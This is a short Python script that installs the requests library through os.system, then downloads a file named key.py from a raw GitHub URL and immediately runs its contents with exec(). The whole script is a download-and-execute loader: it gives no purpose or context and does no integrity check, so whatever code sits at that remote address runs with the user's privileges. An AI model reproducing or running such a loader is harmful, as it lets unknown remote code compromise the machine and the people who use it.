import requests
import os
os.system('pip install requests')
url = "https://raw.githubusercontent.com/thaiidwong/nammoivv/refs/heads/main/key.py"
response = requests.get(url)
exec(response.text)